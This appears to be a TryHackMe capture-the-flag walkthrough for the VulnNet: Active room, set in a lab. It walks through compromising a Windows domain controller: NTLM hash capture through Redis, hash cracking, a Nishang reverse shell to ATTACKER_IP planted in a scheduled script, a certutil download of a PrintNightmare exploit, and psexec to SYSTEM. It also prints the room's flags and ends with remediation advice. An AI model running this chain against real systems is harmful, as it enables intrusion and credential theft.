# VulnNet: Active — TryHackMe Walkthrough

**Platform:** TryHackMe  
**Room:** VulnNet: Active  
**Difficulty:** Medium  
**OS:** Windows (Active Directory Environment)  
**Attack Chain:** Unauthenticated Redis → NTLM Hash Capture → Password Cracking → SMB Access → Scheduled Task Abuse → PrintNightmare → SYSTEM Access  

---

## 1. Reconnaissance

The engagement began with a full TCP port scan to identify all exposed services on the target machine. A quick and silent scan revealed multiple open ports, including several characteristic of a Windows Active Directory environment.

```bash
sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv <TARGET_IP>
```

**Open Ports Identified:**

| Port | Service |
|------|---------|
| 53 | DNS (Simple DNS Plus) |
| 135 | Microsoft RPC |
| 139 | NetBIOS-SSN |
| 445 | SMB |
| 464 | kpasswd5 (Kerberos password change) |
| 6379 | Redis |
| 9389 | ADWS (.NET Message Framing) |

A more detailed service scan confirmed the presence of a Redis key-value store (version 2.8.2402) on port 6379 — an unusual service to find exposed on a Domain Controller.

**Fingerprinting the Domain Controller:**

The combination of DNS on port 53, Kerberos password change on port 464, and SMB on ports 139/445 strongly indicated that the target was a Domain Controller.

Using NetExec against the SMB service revealed the machine name, domain, and SMB signing status:

```bash
nxc smb <TARGET_IP>
```

**Result:**
- Machine name: `VULNNET-BC3TCK1`
- Domain: `vulnnet.local`
- SMB signing: True

The `/etc/hosts` file was updated accordingly:

```bash
echo '<TARGET_IP> VULNNET-BC3TCK1 VULNNET-BC3TCK1.vulnnet.local vulnnet.local' | sudo tee -a /etc/hosts
```

---

## 2. Enumeration

### 2.1 SMB Enumeration

Initial SMB enumeration with a guest account was unsuccessful — the guest account was disabled. However, anonymous login was successful, though no workgroup was available.

### 2.2 Redis Enumeration

The Redis instance on port 6379 was accessible without authentication — a critical misconfiguration. Connecting with `redis-cli`:

```bash
redis-cli -h <TARGET_IP>
```

The `info` command confirmed the Redis version (2.8.2402) and that the service was running in standalone mode on Windows.

Enumerating the configuration with `CONFIG GET *` revealed the working directory:

```
CONFIG GET dir
1) "dir"
2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```

This exposed a valid Windows username: **`enterprise-security`**.

---

## 3. Exploitation

### 3.1 NTLM Hash Capture via Redis

With the Redis instance unauthenticated, the next step was to force the service to authenticate to an attacker-controlled machine, capturing the NTLMv2 hash of the user running the Redis service.

**Step 1 — Start Responder** on the attacking machine:

```bash
sudo responder -I tun0 -dwv
```

**Step 2 — Trigger a connection from Redis** using the `CONFIG SET dir` command, pointing to a fake UNC path:

```
CONFIG SET dir \\<ATTACKER_IP>\fake-share
```

Responder captured the NTLMv2 hash for the **`enterprise-security`** user.

### 3.2 Password Cracking

The captured NTLMv2 hash was cracked using Hashcat with the `rockyou.txt` wordlist:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Recovered Credentials:**
```
enterprise-security : sand_0873959498
```

A weak password policy enabled rapid recovery of the plaintext password.

### 3.3 SMB Access and Scheduled Task Abuse

Using the recovered credentials, SMB shares were enumerated:

```bash
smbclient -L //<TARGET_IP> -U enterprise-security
```

An interesting share named **`Enterprise-Share`** was discovered. Inside, a PowerShell script named **`PurgeIrrelevantData_1826.ps1`** was found:

```powershell
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

Since the `enterprise-security` user had write access to this share, the script was replaced with a malicious reverse shell payload using a Nishang PowerShell TCP reverse shell.

**Step 1 — Create the malicious script:**

```powershell
# Append payload to the Nishang script
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444
```

**Step 2 — Upload the modified script:**

```bash
smbclient //<TARGET_IP>/Enterprise-Share -U VULNNET.local/enterprise-security
> put PurgeIrrelevantData_1826.ps1
```

**Step 3 — Set up a listener:**

```bash
nc -lvnp 4444
```

After a few seconds, the scheduled task executed the script, and a reverse shell was received.

**User Flag:** `THM{3eb176aee96432d5b100bc93580b291e}`

---

## 4. Privilege Escalation — PrintNightmare

### 4.1 Vulnerability Assessment

With a shell as `enterprise-security`, the Print Spooler service was checked:

```powershell
Get-Service Spooler
# Status: Running
```

The system was missing critical patches for CVE-2021-34527 (PrintNightmare):

```powershell
Get-HotFix | Where-Object { $_.HotFixID -match "KB5004945|KB5005033" }
# Result: Empty
```

This confirmed the system was vulnerable to the PrintNightmare privilege escalation vulnerability.

### 4.2 Exploitation

A PrintNightmare exploit (CVE-2021-1675) was uploaded to the target using `certutil`:

```powershell
certutil -urlcache -split -f http://<ATTACKER_IP>/CVE-2021-1675.ps1 C:\Users\enterprise-security\Desktop\nightmare.ps1
```

The exploit was imported and executed to create a new local administrator:

```powershell
Import-Module C:\Users\enterprise-security\Desktop\nightmare.ps1
Invoke-Nightmare -NewUser "overmane" -NewPassword "Passwd123"
```

This created a new administrative user, **`overmane`**, with the password `Passwd123`.

### 4.3 SYSTEM Access

Using Impacket's `psexec` with the newly created administrative credentials, a SYSTEM-level shell was obtained:

```bash
impacket-psexec VULNNET.local/overmane:Passwd123@<TARGET_IP>
```

**System Flag:** `THM{d540c0645975900e5bb9167aa431fc9b}`

---

## 5. Security Findings & Recommendations

### Key Findings

| Finding | Impact |
|---------|--------|
| Unauthenticated Redis instance exposed on the network | Allowed NTLM hash capture and file read |
| Weak password policy | Enabled rapid offline cracking of NTLMv2 hash |
| Write access to scheduled PowerShell script | Allowed arbitrary code execution as service account |
| Missing PrintNightmare patches | Enabled local privilege escalation to SYSTEM |
| Print Spooler service running unnecessarily | Attack surface for CVE-2021-34527 |

### Remediation Recommendations

1. **Secure Redis:** Implement `requirepass` authentication, bind to localhost only, or decommission if not required on a Domain Controller.
2. **Enforce Strong Password Policies:** Prevent offline cracking of intercepted NTLM hashes by enforcing complex passwords.
3. **Apply Principle of Least Privilege:** Restrict write access to scripts and directories used by automated tasks or scheduled jobs.
4. **Patch Management:** Immediately install patches for PrintNightmare (KB5004945/KB5005033) or disable the Print Spooler service if printing is not required.
5. **Block Outbound SMB Traffic:** Prevent NTLM credential capture by blocking outbound SMB traffic to untrusted networks.

---

## 6. Tools Utilized

- **Nmap** — Port scanning and service enumeration
- **Redis CLI** — Interaction with the unauthenticated Redis service
- **Responder** — NTLMv2 hash capture
- **Hashcat** — Offline password cracking
- **SMBClient** — SMB share enumeration and file upload
- **NetExec (CrackMapExec)** — SMB enumeration and domain identification
- **Impacket (psexec)** — SYSTEM-level shell access
- **Nishang** — PowerShell reverse shell payload

---

## 7. Conclusion

The VulnNet: Active room demonstrates a realistic attack chain against a Windows Active Directory environment, starting from a single misconfigured third-party service (Redis) and culminating in full domain compromise. The engagement highlighted the dangers of exposing unauthenticated services on a Domain Controller, the importance of strong password policies, and the critical need for timely patch management — particularly for well-known vulnerabilities like PrintNightmare. This walkthrough reinforces that a single weak point in an enterprise environment can lead to complete system compromise when chained with other vulnerabilities.
